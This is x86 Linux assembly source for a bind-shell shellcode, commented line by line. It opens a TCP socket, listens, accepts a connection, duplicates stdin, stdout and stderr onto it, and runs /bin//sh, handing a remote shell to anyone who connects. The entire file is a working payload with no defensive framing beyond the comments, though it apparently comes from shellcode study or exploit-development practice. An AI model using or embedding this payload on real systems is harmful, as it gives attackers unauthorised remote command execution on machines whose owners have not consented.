global _start

section .text
_start:
xor ebx,ebx         ; Clear EBX
mul ebx             ; Also clear EAX and EDX
mov al,0x66         ; Set AL to 0x66 (SYS_SOCKETCALL)
inc ebx             ; Set EBX to 1 (SOCKET)
push edx            ; Push 0 (PROTOCOL arg)
push ebx            ; Push 1 (SOCK_STREAM arg)
push byte +0x2      ; Push 2 (AF_INET arg)
mov ecx,esp         ; Save pointer to args in ECX
int 0x80            ; Exec interrupt
push edx            ; Push 0 (BACKLOG arg)
push eax            ; Push socket FD (SOCKFD arg)
mov ecx,esp         ; Save pointer to args in ECX
mov al,0x66         ; SYS_SOCKETCALL
mov bl,0x4          ; Set EBX to 4 (LISTEN)
int 0x80            ; Exec interrupt
mov al,0x66         ; SYS_SOCKETCALL
inc ebx             ; Set EBX to 5 (ACCEPT)
int 0x80            ; Exec interrupt
pop ecx             ; Pop SOCKFD value
xchg eax,ebx        ; Move returned FD to EBX
LBL1:
    push byte +0x3f     ; Push DUP2 syscall...
    pop eax             ; ...into EAX
    int 0x80            ; Exec interrupt
    dec ecx             ; Decrement counter
    jns LBL1            ; Jump to 0x3F syscall if >= 0
mov al,0xb          ; EXECVE syscall
push dword 0x68732f2f   ; "//sh"
push dword 0x6e69622f   ; "/bin"
mov ebx,esp         ; Save args to EBX
inc ecx             ; -1 -> 0
int 0x80            ; Exec interrupt
